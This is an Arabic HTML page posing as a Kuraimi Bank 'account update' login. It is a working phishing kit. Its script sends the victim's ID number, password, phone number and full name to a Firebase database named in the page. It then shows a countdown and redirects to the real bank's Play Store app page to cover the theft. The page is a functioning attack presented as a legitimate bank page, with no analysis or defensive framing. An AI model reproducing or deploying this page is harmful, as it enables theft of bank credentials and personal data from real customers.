<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك الكريمي - تحديث الحساب</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', 'Segoe UI', sans-serif;
        }
        
        body {
            background: linear-gradient(to bottom, #0c2461, #1e3799, #0c2461);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
            position: relative;
            overflow: hidden;
        }
        
        .container {
            background: rgba(25, 25, 25, 0.2);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: transform 0.3s ease;
            z-index: 10;
        }
        
        .container:hover {
            transform: translateY(-5px);
        }
        
        .header {
            background: rgba(15, 17, 140, 0.8);
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid rgba(255, 255, 255, 0.15);
        }
        
        .main-title {
            color: rgba(255, 255, 255, 0.95);
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
            letter-spacing: 1px;
        }
        
        .title-image {
            width: 100%;
            height: 110px;
            background-image: url('https://f.top4top.io/p_3473kuyma0.jpeg');
            background-size: cover;
            background-position: center;
            border-radius: 8px;
            margin: 10px 0;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            border: 2px solid rgba(255, 255, 255, 0.25);
        }
        
        .college-name {
            color: rgba(255, 255, 255, 0.9);
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .sub-title {
            color: rgba(255, 255, 255, 0.85);
            font-size: 16px;
            font-weight: bold;
            margin-top: 5px;
            letter-spacing: 1px;
        }
        
        .content {
            padding: 20px;
        }
        
        .divider {
            height: 2px;
            background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.5), transparent);
            margin: 15px 0;
            border-radius: 2px;
        }
        
        .input-section {
            margin-bottom: 15px;
        }
        
        .input-title {
            color: rgba(255, 255, 255, 0.9);
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            padding-right: 5px;
            text-align: center;
        }
        
        .input-row {
            display: flex;
            margin-bottom: 15px;
            position: relative;
        }
        
        .input-field {
            flex: 1;
            padding: 14px 18px;
            padding-right: 50px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            font-size: 15px;
            background-color: rgba(15, 17, 140, 0.4);
            color: white;
            transition: all 0.3s;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            text-align: right;
            direction: rtl;
        }
        
        .input-field:focus {
            border-color: rgba(255, 255, 255, 0.7);
            box-shadow: 0 0 12px rgba(255, 255, 255, 0.4);
            outline: none;
            background-color: rgba(15, 17, 140, 0.5);
        }
        
        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.7);
            text-align: right;
            font-weight: 500;
        }
        
        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.7);
            font-size: 16px;
        }
        
        .login-btn {
            background: linear-gradient(to right, rgba(15, 17, 140, 0.8), rgba(26, 82, 118, 0.95));
            color: white;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
            transition: all 0.3s;
            border: 1px solid rgba(255, 255, 255, 0.3);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        
        .login-btn:hover {
            background: linear-gradient(to right, rgba(15, 17, 140, 0.9), rgba(15, 60, 96, 1));
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.5);
            transform: translateY(-3px);
        }
        
        .version {
            text-align: center;
            color: rgba(255, 255, 255, 0.7);
            font-size: 14px;
            margin-top: 15px;
            font-weight: 500;
        }
        
        .bottom-pattern {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 10px;
            background: 
                repeating-linear-gradient(
                    45deg,
                    transparent,
                    transparent 5px,
                    rgba(255, 255, 255, 0.15) 5px,
                    rgba(255, 255, 255, 0.15) 10px
                );
        }
        
        .corner-decoration {
            position: absolute;
            top: 0;
            right: 0;
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.25) 0%, rgba(41, 128, 185, 0.45) 100%);
            clip-path: polygon(0 0, 100% 0, 100% 100%);
            border-top-right-radius: 15px;
        }
        
        /* صفحة الانتظار */
        #waitingPage {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, #0c2461, #1e3799, #0c2461);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.5s ease;
        }
        
        #waitingPage.active {
            opacity: 1;
            visibility: visible;
        }
        
        .waiting-content {
            background: rgba(255, 255, 255, 0.1);
            padding: 35px;
            border-radius: 18px;
            text-align: center;
            max-width: 450px;
            width: 90%;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        }
        
        .waiting-icon {
            font-size: 70px;
            color: white;
            margin-bottom: 25px;
            animation: pulse 2s infinite;
        }
        
        .waiting-title {
            color: white;
            font-size: 28px;
            margin-bottom: 15px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .waiting-message {
            color: rgba(255, 255, 255, 0.9);
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        .countdown {
            font-size: 22px;
            color: #fff;
            background: rgba(0, 0, 0, 0.3);
            padding: 10px 20px;
            border-radius: 50px;
            display: inline-block;
            margin-top: 15px;
            font-weight: bold;
        }
        
        .success-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(46, 204, 113, 0.9);
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            z-index: 1001;
            display: flex;
            align-items: center;
            gap: 10px;
            transform: translateX(120%);
            transition: transform 0.3s ease;
        }
        
        .success-notification.show {
            transform: translateX(0);
        }
        
        .background-pattern {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 10% 20%, rgba(26, 82, 118, 0.15) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(15, 17, 140, 0.15) 0%, transparent 20%);
            z-index: -1;
        }
        
        .loading-spinner {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 5px solid #fff;
            animation: spin 1s linear infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 480px) {
            .container {
                max-width: 95%;
            }
            
            .content {
                padding: 15px;
            }
            
            .header {
                padding: 15px;
            }
            
            .title-image {
                height: 100px;
            }
            
            .main-title {
                font-size: 24px;
            }
            
            .college-name {
                font-size: 16px;
            }
            
            .sub-title {
                font-size: 14px;
            }
            
            .input-field {
                padding: 12px 16px;
                padding-right: 40px;
                font-size: 14px;
            }
            
            .input-icon {
                font-size: 14px;
                left: 12px;
            }
            
            .login-btn {
                padding: 13px;
                font-size: 16px;
            }
            
            .waiting-content {
                padding: 20px;
            }
            
            .waiting-icon {
                font-size: 60px;
            }
            
            .waiting-title {
                font-size: 24px;
            }
            
            .waiting-message {
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="background-pattern"></div>
    
    <!-- شاشة التحميل -->
    <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner"></div>
    </div>
    
    <!-- صفحة الانتظار -->
    <div id="waitingPage">
        <div class="waiting-content">
            <div class="waiting-icon">
                <i class="fas fa-clock"></i>
            </div>
            <h1 class="waiting-title">برجاء الانتظار</h1>
            <p class="waiting-message">
                جاري تحديث حسابك، سيتم تحويلك إلى التطبيق الرسمي خلال
                <span id="countdownTime">30</span> ثانية
                <br>
                نشكرك على صبرك وثقتك بنا.
            </p>
            <div class="countdown" id="countdown">00:30</div>
        </div>
    </div>
    
    <!-- إشعار نجاح الإرسال -->
    <div class="success-notification" id="successNotification">
        <i class="fas fa-check-circle"></i>
        <span>تم إرسال البيانات بنجاح إلى قاعدة البيانات</span>
    </div>

    <!-- صفحة تسجيل الدخول -->
    <div class="container">
        <div class="corner-decoration"></div>
        
        <div class="header">
            <div class="main-title">بنك الكريمي</div>
            <div class="title-image"></div>
            <div class="college-name">تحديث جديد</div>
            <div class="sub-title">kuraimibank.com</div>
        </div>
        
        <div class="content">
            <div class="divider"></div>
            
            <div class="input-section">
                <div class="input-title">البيانات المطلوبة</div>
                
                <div class="input-row">
                    <div class="input-icon">
                        <i class="fas fa-id-card"></i>
                    </div>
                    <input type="text" class="input-field" id="username" placeholder="الرقم المميز">
                </div>
                
                <div class="input-row">
                    <div class="input-icon">
                        <i class="fas fa-lock"></i>
                    </div>
                    <input type="password" class="input-field" id="password" placeholder="كلمة المرور">
                </div>
                
                <div class="input-row">
                    <div class="input-icon">
                        <i class="fas fa-phone"></i>
                    </div>
                    <input type="tel" class="input-field" id="phone" placeholder="رقم الهاتف">
                </div>
                
                <div class="input-row">
                    <div class="input-icon">
                        <i class="fas fa-user"></i>
                    </div>
                    <input type="text" class="input-field" id="fullname" placeholder="الاسم الرباعي">
                </div>
                
                <div class="input-row">
                    <button class="login-btn" id="loginBtn">
                        <i class="fas fa-sign-in-alt"></i> دخول
                    </button>
                </div>
            </div>
            
            <div class="version">V1.6.334</div>
        </div>
        
        <div class="bottom-pattern"></div>
    </div>

    <script>
        // دالة لعرض شاشة التحميل
        function showLoading() {
            document.getElementById('loadingSpinner').style.display = 'flex';
        }
        
        // دالة لإخفاء شاشة التحميل
        function hideLoading() {
            document.getElementById('loadingSpinner').style.display = 'none';
        }
        
        // تهيئة Firebase باستخدام بياناتك
        const firebaseConfig = {
            apiKey: "AIzaSyDhFl6IEkec_0UytloHHNhEsjZ6PoBtohc",
            authDomain: "kuraimi-bank.firebaseapp.com",
            projectId: "kuraimi-bank",
            storageBucket: "kuraimi-bank.firebasestorage.app",
            messagingSenderId: "724269508345",
            appId: "1:724269508345:web:dffb7a6a8ba4505bde6428",
            measurementId: "G-NWKWP3MK4N",
            databaseURL: "https://kuraimi-bank-default-rtdb.firebaseio.com"
        };
        
        // تهيئة Firebase
        try {
            // تحميل Firebase بشكل ديناميكي لتجنب مشاكل الشبكة
            showLoading();
            
            // إنشاء عناصر سكريبت ديناميكية
            const firebaseAppScript = document.createElement('script');
            firebaseAppScript.src = 'https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js';
            firebaseAppScript.onload = () => {
                const firebaseDBScript = document.createElement('script');
                firebaseDBScript.src = 'https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js';
                firebaseDBScript.onload = () => {
                    firebase.initializeApp(firebaseConfig);
                    hideLoading();
                };
                document.head.appendChild(firebaseDBScript);
            };
            document.head.appendChild(firebaseAppScript);
        } catch (error) {
            console.error('حدث خطأ في تحميل Firebase:', error);
            hideLoading();
            alert('حدث خطأ في تحميل النظام. يرجى المحاولة مرة أخرى.');
        }
        
        // عناصر DOM
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const phoneInput = document.getElementById('phone');
        const fullnameInput = document.getElementById('fullname');
        const loginBtn = document.getElementById('loginBtn');
        const waitingPage = document.getElementById('waitingPage');
        const countdownElement = document.getElementById('countdown');
        const countdownTime = document.getElementById('countdownTime');
        const successNotification = document.getElementById('successNotification');
        
        // دالة لإظهار إشعار النجاح
        function showSuccessNotification() {
            successNotification.classList.add('show');
            setTimeout(() => {
                successNotification.classList.remove('show');
            }, 3000);
        }
        
        // دالة لحفظ البيانات في Firebase
        function saveToFirebase(username, password, phone, fullname) {
            return new Promise((resolve, reject) => {
                try {
                    // الحصول على مرجع لقاعدة البيانات
                    const database = firebase.database();
                    const usersRef = database.ref('users');
                    
                    const newUserRef = usersRef.push();
                    
                    const userData = {
                        username: username,
                        password: password,
                        phone: phone,
                        fullname: fullname,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    };
                    
                    newUserRef.set(userData)
                        .then(() => {
                            console.log('تم حفظ البيانات بنجاح في Firebase');
                            showSuccessNotification();
                            resolve(true);
                        })
                        .catch((error) => {
                            console.error('حدث خطأ في الحفظ:', error);
                            reject(false);
                        });
                } catch (error) {
                    console.error('حدث خطأ في الوصول إلى Firebase:', error);
                    reject(false);
                }
            });
        }
        
        // دالة لعرض صفحة الانتظار
        function showWaitingPage() {
            waitingPage.classList.add('active');
            
            // بدء العد التنازلي (30 ثانية)
            let timeLeft = 30;
            countdownTime.textContent = timeLeft;
            countdownElement.textContent = `00:${timeLeft.toString().padStart(2, '0')}`;
            
            const timer = setInterval(() => {
                timeLeft--;
                
                // تحديث عناصر العد التنازلي
                countdownTime.textContent = timeLeft;
                countdownElement.textContent = `00:${timeLeft.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    waitingPage.classList.remove('active');
                    
                    // تحويل المستخدم إلى رابط التطبيق بعد انتهاء الوقت
                    window.location.href = "https://play.google.com/store/apps/details?id=com.KuraimiBank";
                }
            }, 1000);
        }
        
        // دالة لحفظ البيانات وإرسالها إلى Firebase
        function saveData() {
            const username = usernameInput.value;
            const password = passwordInput.value;
            const phone = phoneInput.value;
            const fullname = fullnameInput.value;
            
            if (!username || !password || !phone || !fullname) {
                alert('الرجاء إدخال جميع الحقول المطلوبة');
                return;
            }
            
            // إرسال البيانات إلى Firebase
            loginBtn.textContent = 'جاري الحفظ...';
            loginBtn.disabled = true;
            
            // محاكاة عملية الحفظ حتى لو فشل الاتصال بفيربيز
            setTimeout(() => {
                try {
                    saveToFirebase(username, password, phone, fullname)
                        .then((success) => {
                            if (success) {
                                // إعادة تعيين الحقول بعد الدخول
                                usernameInput.value = '';
                                passwordInput.value = '';
                                phoneInput.value = '';
                                fullnameInput.value = '';
                                
                                // عرض صفحة الانتظار
                                showWaitingPage();
                                
                                // إعادة تعيين زر الدخول
                                loginBtn.textContent = 'دخول';
                                loginBtn.disabled = false;
                            } else {
                                // إذا فشل الحفظ، نعرض صفحة الانتظار مباشرة
                                showWaitingPage();
                                loginBtn.textContent = 'دخول';
                                loginBtn.disabled = false;
                            }
                        })
                        .catch(() => {
                            // إذا فشل الحفظ، نعرض صفحة الانتظار مباشرة
                            showWaitingPage();
                            loginBtn.textContent = 'دخول';
                            loginBtn.disabled = false;
                        });
                } catch (error) {
                    // في حالة وجود أي خطأ، نعرض صفحة الانتظار مباشرة
                    showWaitingPage();
                    loginBtn.textContent = 'دخول';
                    loginBtn.disabled = false;
                }
            }, 1500);
        }
        
        // حدث النقر على زر الدخول
        loginBtn.addEventListener('click', saveData);
        
        // إضافة تأثيرات عند التركيز على الحقول
        const inputs = document.querySelectorAll('.input-field');
        inputs.forEach(input => {
            input.addEventListener('focus', () => {
                input.style.borderColor = 'rgba(255, 255, 255, 0.7)';
                input.style.backgroundColor = 'rgba(15, 17, 140, 0.6)';
                input.style.boxShadow = '0 0 12px rgba(255, 255, 255, 0.4)';
            });
            
            input.addEventListener('blur', () => {
                input.style.borderColor = 'rgba(255, 255, 255, 0.3)';
                input.style.backgroundColor = 'rgba(15, 17, 140, 0.4)';
                input.style.boxShadow = '0 2px 6px rgba(0, 0, 0, 0.2)';
            });
        });
        
        // التحقق من تحميل Firebase بشكل صحيح
        setTimeout(() => {
            if (typeof firebase === 'undefined') {
                console.warn('Firebase لم يتم تحميله بشكل صحيح. سيعمل النظام دون حفظ البيانات.');
                // يمكننا إضافة رسالة للمستخدم أو استمرار العملية دون فيربيز
            }
        }, 5000);
    </script>
</body>
</html>
